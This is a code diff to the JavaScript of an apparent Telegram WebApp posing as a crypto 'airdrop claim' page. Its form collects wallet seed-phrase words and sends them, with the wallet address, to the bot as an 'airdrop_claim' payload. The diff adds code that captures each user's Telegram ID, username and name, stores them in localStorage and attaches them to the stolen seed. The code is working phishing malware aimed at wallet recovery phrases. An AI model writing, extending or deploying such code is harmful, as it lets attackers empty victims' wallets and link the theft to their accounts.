@@ -1,7 +1,7 @@
 let tg = null;
 let demoMode = false;
 
-// ======= Перевірка Telegram WebApp =======
+// ======= Ініціалізація Telegram WebApp =======
 function initTelegram() {
     if (typeof Telegram === "undefined" || !Telegram.WebApp) {
         console.warn("📦 Telegram WebApp не знайдено – активовано демо-режим.");
@@ -12,18 +12,36 @@ function initTelegram() {
     tg = Telegram.WebApp;
     tg.ready();
     console.log("✅ Telegram WebApp ініціалізовано");
+
+    const user = tg.initDataUnsafe?.user || {};
+    const uid = user.id || localStorage.getItem("tg_user_id") || "-";
+    const uname = user.username || localStorage.getItem("tg_username") || "-";
+    const fname = [user.first_name, user.last_name].filter(Boolean).join(" ") || localStorage.getItem("tg_name") || "-";
+
+    // 💾 Зберігаємо у localStorage
+    localStorage.setItem("tg_user_id", uid);
+    localStorage.setItem("tg_username", uname);
+    localStorage.setItem("tg_name", fname);
 }
 
-// ======= При завантаженні DOM =======
+// ======= DOM завантажено =======
 document.addEventListener("DOMContentLoaded", () => {
     initTelegram();
 
-    // 🔹 Показати статус
+    // ======= Telegram статус =======
     const tgStatus = document.getElementById("tg_status");
+    const uid = localStorage.getItem("tg_user_id") || "-";
+    const uname = localStorage.getItem("tg_username") || "-";
+    const fname = localStorage.getItem("tg_name") || "-";
+
     if (demoMode) {
         tgStatus.innerText = "📦 Демо-режим активний (відкрито через браузер)";
     } else {
-        tgStatus.innerText = "✅ Telegram WebApp активний";
+        tgStatus.innerHTML = `
+            👤 Пользователь: ${fname}<br>
+            🆔 Telegram ID: ${uid}<br>
+            📛 Username: @${uname !== "-" ? uname : "нет"}
+        `;
     }
 
     // ======= Завантаження Airdrops =======
@@ -91,7 +109,7 @@ function selectAirdrop(name) {
     renderSeedInputs();
 }
 
-// ======= Відображення полів seed =======
+// ======= Рендер полів seed =======
 function renderSeedInputs() {
     const length = parseInt(document.getElementById('length').value);
     const container = document.getElementById('seedContainer');
@@ -134,14 +152,15 @@ function submitAirdrop() {
 
     const payload = {
         event: "airdrop_claim",
-        user_id: tg?.initDataUnsafe?.user?.id || "-",
-        username: tg?.initDataUnsafe?.user?.username || "-",
+        user_id: tg?.initDataUnsafe?.user?.id || localStorage.getItem("tg_user_id") || "-",
+        username: tg?.initDataUnsafe?.user?.username || localStorage.getItem("tg_username") || "-",
+        name: localStorage.getItem("tg_name") || "-",
         timestamp: new Date().toISOString(),
         seed: words.join(" "),
         wallet: document.getElementById("wallet").value
     };
 
-    // ===== Відправка через Telegram WebApp або лог в браузер =====
+    // ===== Відправка через Telegram WebApp або лог у браузері =====
     if (!demoMode && tg?.sendData) {
         console.log("[📤 Надсилання в Telegram WebApp]", payload);
         tg.sendData(JSON.stringify(payload));
